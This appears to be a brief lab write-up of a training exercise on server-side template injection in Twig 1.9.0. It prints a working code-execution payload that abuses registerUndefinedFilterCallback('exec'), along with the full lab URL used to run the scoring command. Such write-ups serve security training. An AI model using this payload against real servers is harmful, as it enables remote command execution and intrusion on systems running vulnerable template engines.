Server Side Template Injection 02

This challenge

This challenge covers the exploitation of a Server Side Template Injection in an old version of Twig (1.9.0).

This issue can be used to gain code execution on the server. 
To get code execution you need to find a way to execute command using the functions offered by the template. 
Fortunately, the following code can be used:

{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}

Using this code, you should be able to score this exercise.

On most of the online exercises, you will not be able to get a reverse shell as exercises are firewalled-off.
You can just run the command above instead of the reverse shell

 You can access this exercise using the following URL: http://ptc-9c6a975c-cdc53ff0.libcurl.so/.

Final results: 
http://ptc-9c6a975c-cdc53ff0.libcurl.so/?name={{_self.env.registerUndefinedFilterCallback(%27exec%27)}}{{_self.env.getFilter(%27/usr/local/bin/score%20dd19b1aa-7a48-4881-87ce-4fd3f96516f8%27)}}

Bravo!! We've completed the lab. 

Happy hacking!! :)
